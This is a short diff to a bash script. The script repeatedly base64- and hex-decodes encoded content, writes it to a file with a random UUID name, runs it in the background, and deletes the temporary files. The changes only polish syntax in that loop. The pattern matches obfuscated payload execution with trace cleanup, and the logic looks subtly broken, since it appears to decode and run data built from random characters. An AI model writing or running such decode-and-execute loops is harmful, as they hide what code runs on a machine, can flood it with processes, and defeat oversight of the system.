@@ -43,10 +43,10 @@ for ((i=1; i<=$iterations; i++)); do
     echo "$random_chars" >> temp_base64_encoded_command.txt
 
     # Decode the base64 code
-    base64_decoded=$(cat temp_base64_encoded_command.txt | base64 -d)
+    base64_decoded=$(base64 -d temp_base64_encoded_command.txt)
 
     # Convert decoded code back to hex
-    hex_decoded=$(echo "$base64_decoded" | xxd -r -p)
+    hex_decoded=$(echo -n "$base64_decoded" | xxd -r -p)
 
     # Write the hex code to a temporary file
     echo "$hex_decoded" > temp_hex_decoded.txt
@@ -58,7 +58,7 @@ for ((i=1; i<=$iterations; i++)); do
     mv temp_hex_decoded.txt "$(cat temp_base64_encoded_script_name.txt)"
 
     # Execute the script with the random UUID as the script name
-    ./"$(cat temp_base64_encoded_script_name.txt)" &
+    "./$(cat temp_base64_encoded_script_name.txt)" &
 
     # Clean up temporary files
     rm temp_base64_encoded_uuid.txt temp_base64_encoded_script_name.txt temp_base64_encoded_command.txt
